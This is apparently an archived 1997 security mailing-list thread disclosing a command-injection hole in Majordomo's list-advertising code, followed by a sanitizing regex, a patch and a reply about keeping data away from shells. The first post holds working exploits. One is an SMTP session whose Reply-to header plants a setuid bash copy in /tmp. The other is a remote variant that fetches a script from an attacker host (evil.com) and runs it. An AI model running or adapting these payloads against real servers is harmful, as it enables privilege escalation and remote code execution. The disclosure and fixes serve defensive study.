@@ -1,0 +1,161 @@
+
+I have discovered a vulnerablility in "majordomo" that allows local and
+remote users to execute commands with the rights of the user running the server. This user is usually in the daemon group, so this can be quite harmful.
+
+Still, there is a condition for the exploit to work. The server should
+have at least one list that uses the "advertise" or "noadvertise"
+directives in the configuration files. These directives indicate if the
+list should (or should not) be included in a reply to a "LISTS" command
+depending on the address the request came from. The exploit also works if
+the server has one or more "hidden" lists (see the Majordomo documentation
+for details).
+
+Here's a piece of the configuration file:
+
+-- lrazvan.config --
+
+        # advertise            [regexp_array] (undef) <majordomo>
+        # If the requestor email address matches one of these regexps, then
+        # the list will be listed in the output of a lists command. Failure
+        # to match any regexp excludes the list from the output. The
+        # regexps under noadvertise override these regexps.
+advertise           <<  END
+/.*/
+END
+-- end lrazvan.config --
+
+The one above tells majordomo to include this list in any "LISTS" request.
+
+The problem is that when the server finds a list that has one of these
+attributes ("advertise" or "noadvertise"), it will try to match the
+reply-to address against these patterns. It uses an "eval" command to do this.
+
+Let's take a look at the PERL source (the do_lists procedure):
+
+-- majordomo --
+foreach $i (@array) {
+                      $command = "(q~$reply_addr~ =~ $i)";
+                      $result = 1, last if (eval $command);
+                   }
+
+-- end majordomo --
+
+$reply_addr is the result of some paranoid validation. It cannot contain
+<,>,[,],-,+,(,),; etc..
+But with a few tricks, this won't be a problem :).
+
+Now, for the exploits. There a two of them, one for the local users who
+just want a setuid shell (with the rights of the server owner, usually
+majordomo.daemon), and one for the remote users who might want to copy
+some files or execute commands remotely (the old "mail foo@foo.net <
+/etc/passwd" won't work, it contains '<' ...).
+
+Local exploit:
+--exploit--
+telnet localhost 25
+
+helo localhost
+mail from: user
+rcpt to: majordomo (or whatever the name of the majordomo user is)
+data
+From: user
+To: majordomo
+Reply-to: a~.`/bin/cp\${IFS}/bin/bash\${IFS}/tmp/lord&&/bin/chmod\${IFS}4777\${IFS}/tmp/lord`.q~a/ad=cucu/c=blu\\\@kappa.ro
+
+LISTS
+.
+quit
+--end of exploit --
+
+The "Reply-to" field does all the hard work. I think it needs some explaining. First, we use $IFS instead of spaces (guess why...), and '&&' instead of ';'. The '&&' operator does in bash the same thing it does in perl. "a&&b" means "execute a and if succ
+essful execute b". The address is composed in such a way that it passes the tests majordomo uses (it considers it as a X400 address). So don't change anything in there (of course, you can change the commands, but not the syntax). The exploit will copy /bi
+n/bash as /tmp/lord and change permissions for it to 4777 (setuid + rwx for everyone).
+
+For the remote users, change the Reply-to field to something like:
+
+Reply-to: a~.`/usr/bin/rcp\${IFS}user@evil.com:script\${IFS}/tmp/script&&source\${IFS}/tmp/script`.q~a/ad=cucu/c=blu\\\@kappa.ro
+
+Make sure user@evil.com can connect from the remote site. evil.com is your
+site.
+You will have to edit the "script" file in your home directory and make it
+do eveverything you want (you can now use all those "forbidden characters").
+
+I am too tired to find a fix for this right now. Some more validation
+might help.
+I have tested this on Majordomo version 1.94.3. Other versions could be
+vulnerable.
+
+
+
+-------------------------------------------------------------------------------------------------------------
+
+
+Although I know little of the internals of majordomo, this is a standard
+validation problem just like the slew of CGI vulnerabilities that
+recirculated about 6 months ago. This has probably been said a million times
+before, but as these vulnerabilities seem to keep re-appearing maybe its
+worth saying again.
+
+By far the safest way of doing any sort of validation is to provide a list
+of the safe characters, and not permit anything else. The perl to implement
+such a scheme is remarkably simple:
+
+  $reply_addr =~ s/[^\w\.@-]//g;
+
+This will remove all characters which are not alphanumeric, a period, an at
+symbol or a hyphen. Of course, you may like to include a small piece of code
+which saves insecure strings in a file somewhere, along with the sender.
+
+
+-------------------------------------------------------------------------------------------------------------
+
+
+This should fix the problem in a fairly straightforward manner:
+
+--- majordomo-pre-list-fix      Tue Aug 26 14:11:07 1997
++++ majordomo   Tue Aug 26 15:06:52 1997
+@@ -1374,7 +1374,7 @@
+                if ($'config_opts{$list, 'advertise'} ne '') {
+                   @array = split(/\001/,$'config_opts{$list,
+'advertise'});
+                   foreach $i (@array) {
+-                     $command = "(q~$reply_addr~ =~ $i)";
++                     $command = '($reply_addr'." =~ $i)";
+                      $result = 1, last if (eval $command);
+                   }
+                 } else { $result = 1; }
+@@ -1384,7 +1384,7 @@
+                   @array = split(/\001/,$'config_opts{$list,
+'noadvertise'});
+
+                   foreach $i (@array) {
+-                     $command = "(q~$reply_addr~ =~ $i)";
++                     $command = '($reply_addr'." =~ $i)";
+                      $result = 0, last if (eval $command);
+                    }
+                }
+
+------------------------------------------------------------------------------------------------------------
+
+
+> By far the safest way of doing any sort of validation is to
+> provide a list of the safe characters, and not permit anything
+> else. The perl to implement such a scheme is remarkably simple:
+
+>   $reply_addr =~ s/[^\w\.@-]//g;
+
+> This will remove all characters which are not alphanumeric, a
+> period, an at symbol or a hyphen. Of course, you may like to
+> include a small piece of code which saves insecure strings in a
+> file somewhere, along with the sender.
+
+No.  The *very* safest way is "Don't let data anywhere near a shell!"
+The CGI FAQ tells how to do this stuff right.  So does the Perl FAQ
+(which now ships *with* Perl as part of the distribution).  So does
+the (new) Camel book.
+
+There's no excuse for letting data of any kind get anywhere near a
+shell line.  Ugh.  Especially with the ultra-flexible Perl constructs.
+
+
+-----------------------------------------------------------------------------------------------------------
